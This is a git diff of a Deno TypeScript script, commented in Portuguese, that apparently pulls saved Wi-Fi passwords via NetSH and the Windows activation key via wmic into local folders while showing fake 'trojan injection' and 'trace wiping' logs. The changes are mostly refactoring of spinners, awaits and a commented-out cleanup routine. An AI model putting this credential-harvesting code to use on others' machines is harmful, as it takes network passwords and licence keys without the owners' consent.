@@ -1,8 +1,8 @@
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { keypress } from '@cliffy/keypress';
 import { DateTime } from '@luxon';
-import colors from '@colors';
 import { delay } from '@std';
+import colors from '@colors';
 import qr from '@qrcode';
 
 /** showLogs
@@ -10,7 +10,6 @@ import qr from '@qrcode';
  * e os delays serão desativados
  */
 let showLogs: boolean | number = true;
-let currentSector: string;
 let winLKey: string;
 let counter = 0;
 colors;
@@ -29,15 +28,15 @@ silentMode();
 // Title.txt contém uma string colorida bem cringe
 const title: string = await Deno.readTextFile('Title.txt')
 	.catch(() => '');
-console.log(title || '');
+console.log(showLogs && title || '');
 
 class Spinner {
 	sector: string;
 	text: string;
 	spinner: TerminalSpinner | undefined;
 
-	constructor(text: string, sector?: string) {
-		this.sector = sector || currentSector;
+	constructor(sector: string, text: string) {
+		this.sector = sector;
 		this.text = text;
 
 		// Inicia Spinner
@@ -53,13 +52,13 @@ class Spinner {
 			}).start());
 	}
 
-	end(msg?: string) {
-		this.text = msg || this.text;
+	end(msg: string) {
+		this.text = msg;
 		this.spinner?.succeed(this._format());
 	}
 
-	fail(msg?: string) {
-		this.text = msg || this.text;
+	fail(msg: string) {
+		this.text = msg;
 		this.spinner?.fail(this._format());
 	}
 
@@ -81,8 +80,10 @@ await NetSHProfileCollector();
 // Copiar key do Windows
 await copyWinKey();
 
-// Limpar registros de arquivos
-await clearTraces();
+// // Limpar registros de arquivos
+// await Deno.remove('.tempdata', { recursive: true })
+// 	.catch(() => {});
+// // 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
 
 async function NetSHProfileCollector() {
 	createFakeLogs();
@@ -91,10 +92,10 @@ async function NetSHProfileCollector() {
 	 * enquanto o resto do código continua rodando
 	 */
 
-	Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
+	await Deno.mkdir('.tempdata') // Cria pasta de arquivos temporários (se não existir)
 		.catch(() => {});
 
-	Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
+	await Deno.mkdir('WiFiPasswords') // Cria pasta de senhas (se não existir)
 		.catch(() => {});
 
 	// Chama a API do Windows
@@ -139,23 +140,17 @@ async function copyWinKey() {
 		'wmic path softwarelicensingservice get OA3xOriginalProductKey',
 	)).split('\n')[1];
 
-	Deno.mkdir('WindowsKeys') // Cria pasta de chaves do Windows (se não existir)
+	await Deno.mkdir('WindowsKeys') // Cria pasta de chaves do Windows (se não existir)
 		.catch(() => {});
 
-	Deno.writeTextFileSync(
+	await Deno.writeTextFile(
 		`WindowsKeys/${Deno.hostname()}.txt`,
 		`Máquina: ${Deno.hostname()}\nData: ${getTimestamp()}\nChave de ativação do Windows: ${winLKey}`,
 	);
 }
 
-async function clearTraces() {
-	await Deno.remove('.tempdata', { recursive: true })
-		// 'recursive' significa que é pra apagar mesmo se tiver arquivos dentro
-		.catch(() => {});
-}
-
 async function createFakeLogs() {
-	currentSector = 'Wi-Fi CLONER';
+	let spinner;
 	const fakeLogs = [
 		['Injetando Trojan na API do NetSH...', 'Script injetado.'],
 		['Modificando permissões do Windows...', 'Permissões concedidas.'],
@@ -167,24 +162,22 @@ async function createFakeLogs() {
 
 	// Exibe status fakes pra impressionar leigos
 	for (const msg of fakeLogs) {
-		const spinner = new Spinner(msg[0]);
+		spinner = new Spinner('Wi-Fi CLONER', msg[0]);
 		await sleep(random());
 		spinner.end(msg[1]);
 	}
 
-	const wifiLog = new Spinner('Clonando redes Wi-Fi...');
+	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
 	await sleep(random(1_000, 3_000));
-	wifiLog.end(`${counter} redes clonadas.`);
+	spinner.end(`${counter} redes clonadas.`);
 
-	currentSector = 'KEY CLONER';
-	const keyLog = new Spinner('Obtendo chave de ativação...');
+	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
 	await sleep(random());
-	keyLog.end(`Chave de ativação obtida: ${winLKey}`);
+	spinner.end(`Chave de ativação obtida: ${winLKey}`);
 
-	currentSector = 'CLEANER';
-	const tracesLog = new Spinner('Apagando registros...');
+	spinner = new Spinner('CLEANER', 'Apagando registros...');
 	await sleep(random());
-	tracesLog.end('Registros excluídos.');
+	spinner.end('Registros excluídos.');
 
 	Deno.exit();
 }
@@ -208,10 +201,10 @@ async function executeCommand(cmd: string) {
 function clearTags(matches: IterableIterator<RegExpMatchArray>) {
 	// Regex pra filtrar as tags do XML
 	const res: string[] = [];
+
 	for (const match of matches) {
 		res.push(
-			String(match[0])
-				.replace(/<.*?>/g, ''),
+			String(match[0]).replace(/<.*?>/g, ''),
 		);
 	}
 	return res;
@@ -223,9 +216,8 @@ function random(min = 500, max = 2_500) {
 }
 
 function getTimestamp(format = 'DDDD'): string {
-	return DateTime.now()
+	return DateTime.now().setLocale('pt')
 		.setZone('America/Sao_Paulo')
-		.setLocale('pt')
 		.toFormat(format); // Data formatada
 }
 
